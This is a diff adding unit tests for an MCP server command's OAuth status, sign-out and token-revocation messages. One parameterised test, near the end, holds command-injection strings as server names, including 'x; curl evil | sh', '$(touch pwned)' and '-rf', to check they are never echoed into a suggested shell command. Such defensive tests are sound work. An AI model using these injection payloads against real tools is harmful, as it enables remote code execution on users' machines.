@@ -213,3 +213,118 @@ describe('executeMCPActivationCommand', () => {
     expect(result.message).toContain('server-1');
   });
 });
+
+describe('/mcp and OAuth sign-in', () => {
+  function oauthAdapter(): ICommandMCPActivationAdapter & { loggedOut: string[] } {
+    const loggedOut: string[] = [];
+    return {
+      loggedOut,
+      list: () => [
+        summary({ serverId: 'files', status: 'approved', allowed: true }),
+        summary({ serverId: 'plain', status: 'approved', allowed: true }),
+      ],
+      approve: async () => summary(),
+      reject: async () => summary(),
+      revoke: async () => summary(),
+      oauthStatus: async () => [{ serverId: 'files', state: 'expired-refreshable' }],
+      oauthLogout: async (serverId) => {
+        loggedOut.push(serverId);
+        return {
+          serverId,
+          removed: true,
+          revocation: 'failed',
+          revocationFailure: 'revocation-failed',
+        };
+      },
+    };
+  }
+
+  it('shows each OAuth server sign-in state as a fixed word, and nothing for the rest', async () => {
+    const result = await executeMCPActivationCommand(context(oauthAdapter()), 'status');
+    const lines = result.message.split('\n');
+    expect(lines.find((line) => line.includes('files'))).toMatch(
+      /OAuth: token expired, will refresh$/,
+    );
+    expect(lines.find((line) => line.includes('plain'))).not.toContain('OAuth');
+    const servers = (result.data as { servers: Record<string, unknown>[] }).servers;
+    expect(servers[0]).toMatchObject({ serverId: 'files', oauth: 'expired-refreshable' });
+    expect(servers[1]).not.toHaveProperty('oauth');
+  });
+
+  it('signs out through the port and reports revocation by reason only', async () => {
+    const adapter = oauthAdapter();
+    const result = await executeMCPActivationCommand(context(adapter), 'logout files');
+    expect(adapter.loggedOut).toEqual(['files']);
+    expect(result.success).toBe(true);
+    expect(result.message).toBe(
+      'Signed out of MCP server files; token revocation failed (revocation-failed); ' +
+        'the tokens stay valid until they expire.',
+    );
+  });
+
+  it('says which token was revoked when only one was', async () => {
+    const adapter: ICommandMCPActivationAdapter = {
+      ...oauthAdapter(),
+      oauthLogout: async (serverId) => ({
+        serverId,
+        removed: true,
+        revocation: 'partial',
+        revocationFailure: 'token-type-not-revocable',
+        tokens: [
+          { token: 'refresh_token', revoked: true },
+          { token: 'access_token', revoked: false, failure: 'token-type-not-revocable' },
+        ],
+      }),
+    };
+    const result = await executeMCPActivationCommand(context(adapter), 'logout files');
+    expect(result.message).toBe(
+      'Signed out of MCP server files; the refresh token was revoked; the access token was not ' +
+        '(token-type-not-revocable) and stays valid until it expires.',
+    );
+  });
+
+  it('refuses to sign out of a server that does not declare OAuth', async () => {
+    const adapter = oauthAdapter();
+    const result = await executeMCPActivationCommand(context(adapter), 'logout plain');
+    expect(result.success).toBe(false);
+    expect(adapter.loggedOut).toEqual([]);
+  });
+
+  function withServer(serverId: string): ICommandMCPActivationAdapter {
+    return {
+      ...oauthAdapter(),
+      list: () => [summary({ serverId, status: 'approved', allowed: true })],
+      oauthStatus: async () => [{ serverId, state: 'sign-in-required' }],
+    };
+  }
+
+  it('points a server that needs a sign-in at its terminal command', async () => {
+    const result = await executeMCPActivationCommand(context(withServer('files')), 'status');
+    expect(result.message).toContain('OAuth: sign-in required (run robota mcp login files)');
+  });
+
+  it.each([
+    ['a command separator', 'x; curl evil | sh'],
+    ['a command substitution', 'x$(touch pwned)'],
+    ['backticks', 'x`touch pwned`'],
+    ['a backslash-quote', "\\';touch pwned;#"],
+    ['a leading dash', '-rf'],
+    ['a leading equals sign', '=cmd'],
+    ['a newline', 'x\nrobota mcp login good'],
+    ['an escape sequence', 'x\u001b[2Kgood'],
+    ['a right-to-left override', 'x‮good'],
+  ])('never puts a name with %s into the sign-in command', async (_what, name) => {
+    const result = await executeMCPActivationCommand(context(withServer(name)), 'status');
+    const hint = /\(run robota mcp login [^)]*\)/.exec(result.message)?.[0];
+    expect(hint).toBe('(run robota mcp login <server>; its name cannot be shown safely here)');
+  });
+
+  it('has no in-session sign-in, and a sign-out needs a server', async () => {
+    const login = await executeMCPActivationCommand(context(oauthAdapter()), 'login files');
+    expect(login.success).toBe(false);
+    expect(login.message).not.toContain('robota mcp login');
+    const logout = await executeMCPActivationCommand(context(oauthAdapter()), 'logout');
+    expect(logout.success).toBe(false);
+    expect(logout.message).toBe('Usage: /mcp logout <serverId>');
+  });
+});
